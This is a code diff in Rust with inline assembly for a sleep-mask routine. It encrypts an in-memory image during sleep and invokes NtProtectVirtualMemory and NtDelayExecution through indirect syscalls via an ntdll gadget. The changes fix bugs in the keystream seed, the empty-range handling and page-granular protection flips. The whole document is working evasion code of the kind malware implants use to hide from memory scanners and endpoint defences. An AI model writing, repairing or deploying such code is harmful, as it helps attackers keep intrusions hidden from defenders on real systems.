@@ -67,18 +67,22 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "mov  rdi, [r15 + 0x08]", // img_end
         "mov  rsi, [r15 + 0x10]", // stub_start
         "mov  r12, [r15 + 0x18]", // stub_end
-        "mov  eax, [r15 + 0x28]", // ssn (u32)
         "mov  r13, [r15 + 0x30]", // gadget
         "mov  r14, [r15 + 0x38]", // interval
-        "mov  rax, [r15 + 0x20]", // keystream seed
+        "xor  ebp, ebp",          // flip flags (bit0 range1, bit1 range2)
         // ---- flip both encrypted ranges writable (RX payloads) --------
+        // BOTH flips happen before any keystream work: the flip syscalls
+        // clobber rax (SSN, then NTSTATUS) and rax carries the keystream
+        // state - a clobbered seed encrypts and decrypts with different
+        // streams, scrambling the image for good.
         // Locals for NtProtectVirtualMemory: [rsp+0x00] = base (in/out),
         // [rsp+0x08] = region size (u64, in/out), [rsp+0x10] = old (out),
         // [rsp+0x20] = fifth-argument slot (written per call).
         // Range 1: [img_base, stub_start).
-        "mov  [rsp], rbx",
         "mov  rcx, rsi",
         "sub  rcx, rbx",
+        "jz   1f", // empty range (page-aligned bounds): nothing to flip
+        "mov  [rsp], rbx",
         "mov  [rsp + 0x08], rcx",
         "mov  rcx, -1", // NtCurrentProcess()
         "lea  rdx, [rsp]",
@@ -89,10 +93,16 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "mov  r10, rcx",
         "mov  eax, [r15 + 0x40]", // NtProtectVirtualMemory SSN
         "call r13",
+        "mov  [r15 + 0x48], eax", // range-1 flip status (for the caller)
+        "test eax, eax",
+        "jnz  1f", // flip failed: never touch a non-writable range
+        "or   ebp, 1",
+        "1:",
         // Range 2: [stub_end, img_end).
-        "mov  [rsp], r12",
         "mov  rcx, rdi",
         "sub  rcx, r12",
+        "jz   2f", // empty range: nothing to flip
+        "mov  [rsp], r12",
         "mov  [rsp + 0x08], rcx",
         "mov  rcx, -1",
         "lea  rdx, [rsp]",
@@ -103,10 +113,19 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "mov  r10, rcx",
         "mov  eax, [r15 + 0x40]",
         "call r13",
+        "mov  [r15 + 0x4C], eax", // range-2 flip status (for the caller)
+        "test eax, eax",
+        "jnz  2f",
+        "or   ebp, 2",
+        // ---- keystream seed, after every flip ------------------------
+        "2:",
+        "mov  rax, [r15 + 0x20]", // seed
         // ---- encrypt range 1: [img_base, stub_start) ----------------
-        "1:",
+        "test ebp, 1",
+        "jz   4f",
+        "3:",
         "cmp  rbx, rsi",
-        "jae  2f",
+        "jae  4f",
         "xor  byte ptr [rbx], al",
         "inc  rbx",
         // keystream: xorshift64, one byte per step (same stream on decrypt)
@@ -120,43 +139,14 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "shl  rdx, 17",
         "xor  rax, rdx",
         "shr  rax, 8",
-        "jmp  1b",
-        // ---- encrypt range 2: [stub_end, img_end) --------------------
-        "2:",
-        "mov  rbx, r12",
-        "3:",
-        "cmp  rbx, rdi",
-        "jae  4f",
-        "xor  byte ptr [rbx], al",
-        "inc  rbx",
-        "mov  rdx, rax",
-        "shl  rdx, 13",
-        "xor  rax, rdx",
-        "mov  rdx, rax",
-        "shr  rdx, 7",
-        "xor  rax, rdx",
-        "mov  rdx, rax",
-        "shl  rdx, 17",
-        "xor  rax, rdx",
-        "shr  rax, 8",
         "jmp  3b",
-        // ---- sleep: NtDelayExecution(FALSE, &interval) ----------------
+        // ---- encrypt range 2: [stub_end, img_end) --------------------
         "4:",
-        "mov  [rsp], r14",        // local interval
-        "xor  ecx, ecx",          // Alertable = FALSE
-        "mov  rdx, rsp",          // &interval
-        "mov  r10, rcx",          // syscall ABI: arg1 -> r10
-        "mov  eax, [r15 + 0x28]", // SSN
-        "mov  r11, r13",          // gadget: syscall; ret in ntdll
-        "call r11",
-        // ---- decrypt: regenerate the identical stream -----------------
-        "mov  rax, [r15 + 0x20]", // same seed
-        "mov  rbx, [r15 + 0x00]", // img_base
-        "mov  rdi, [r15 + 0x08]", // img_end
-        "mov  rsi, [r15 + 0x10]", // stub_start
-        "mov  r12, [r15 + 0x18]", // stub_end
+        "test ebp, 2",
+        "jz   6f",
+        "mov  rbx, r12",
         "5:",
-        "cmp  rbx, rsi",
+        "cmp  rbx, rdi",
         "jae  6f",
         "xor  byte ptr [rbx], al",
         "inc  rbx",
@@ -171,10 +161,27 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "xor  rax, rdx",
         "shr  rax, 8",
         "jmp  5b",
+        // ---- sleep: NtDelayExecution(FALSE, &interval) ----------------
         "6:",
-        "mov  rbx, r12",
+        "mov  [rsp], r14",        // local interval
+        "xor  ecx, ecx",          // Alertable = FALSE
+        "mov  rdx, rsp",          // &interval
+        "mov  r10, rcx",          // syscall ABI: arg1 -> r10
+        "mov  eax, [r15 + 0x28]", // SSN
+        "mov  r11, r13",          // gadget: syscall; ret in ntdll
+        "call r11",
+        // ---- decrypt: regenerate the identical stream -----------------
+        // Same skips as the encrypt (the stream position stays in sync:
+        // it advances one step per byte actually ciphered).
+        "mov  rax, [r15 + 0x20]", // same seed
+        "mov  rbx, [r15 + 0x00]", // img_base
+        "mov  rdi, [r15 + 0x08]", // img_end
+        "mov  rsi, [r15 + 0x10]", // stub_start
+        "mov  r12, [r15 + 0x18]", // stub_end
+        "test ebp, 1",
+        "jz   8f",
         "7:",
-        "cmp  rbx, rdi",
+        "cmp  rbx, rsi",
         "jae  8f",
         "xor  byte ptr [rbx], al",
         "inc  rbx",
@@ -189,10 +196,31 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "xor  rax, rdx",
         "shr  rax, 8",
         "jmp  7b",
-        // ---- epilogue -------------------------------------------------
-        // ---- restore the original protection -------------------------
         "8:",
+        "mov  rbx, r12",
+        "test ebp, 2",
+        "jz   10f",
+        "9:",
+        "cmp  rbx, rdi",
+        "jae  10f",
+        "xor  byte ptr [rbx], al",
+        "inc  rbx",
+        "mov  rdx, rax",
+        "shl  rdx, 13",
+        "xor  rax, rdx",
+        "mov  rdx, rax",
+        "shr  rdx, 7",
+        "xor  rax, rdx",
+        "mov  rdx, rax",
+        "shl  rdx, 17",
+        "xor  rax, rdx",
+        "shr  rax, 8",
+        "jmp  9b",
+        // ---- restore the original protection -------------------------
+        "10:",
         // Range 1: [img_base, stub_start).
+        "test ebp, 1",
+        "jz   12f",
         "mov  rbx, [r15 + 0x00]",
         "mov  [rsp], rbx",
         "mov  rcx, rsi",
@@ -207,7 +235,10 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "mov  r10, rcx",
         "mov  eax, [r15 + 0x40]",
         "call r13",
+        "12:",
         // Range 2: [stub_end, img_end).
+        "test ebp, 2",
+        "jz   13f",
         "mov  [rsp], r12",
         "mov  rcx, rdi",
         "sub  rcx, r12",
@@ -222,7 +253,7 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "mov  eax, [r15 + 0x40]",
         "call r13",
         // ---- epilogue -----------------------------------------------
-        "9:",
+        "13:",
         "add  rsp, 0x38",
         "pop  r15",
         "pop  r14",
@@ -319,11 +350,35 @@ pub unsafe fn build_params(
         return None;
     }
 
+    // Page-granular encrypted ranges: NtProtectVirtualMemory flips WHOLE
+    // pages, and the stub lives at image offset 0x60 - inside the first
+    // page. A flip of [img_base, stub_start) would render the stub's own
+    // page non-executable mid-execution (observed as an execute violation
+    // at the instruction right after the flip syscall). The ranges are
+    // therefore clamped to page boundaries that EXCLUDE the stub's
+    // page(s): those pages stay plaintext for the whole sleep (the entry
+    // stub lives there too - a documented exposure).
+    let enc1_end = stub_start & !0xFFF; // start of the stub's page
+    let enc1_end = if enc1_end <= img_base {
+        img_base
+    } else {
+        enc1_end
+    };
+    let enc2_base = (stub_end + 0xFFF) & !0xFFF; // end of the stub's page
+    let enc2_base = if enc2_base >= img_end {
+        img_end
+    } else {
+        enc2_base
+    };
+
     Some(SleepMaskParams {
-        img_base,
-        img_end,
-        stub_start,
-        stub_end,
+        // The stub consumes these as the two encrypted ranges; an empty
+        // range (base == end) is skipped naturally by every loop and
+        // flip guard.
+        img_base, // range 1: [img_base, enc1_end)
+        img_end,  // range 2: [enc2_base, img_end)
+        stub_start: enc1_end,
+        stub_end: enc2_base,
         seed: 0,
         ssn: 0,
         _pad: 0,
@@ -331,5 +386,7 @@ pub unsafe fn build_params(
         interval: 0,
         protect_ssn,
         orig_protect: orig,
+        flip1_status: 0,
+        flip2_status: 0,
     })
 }
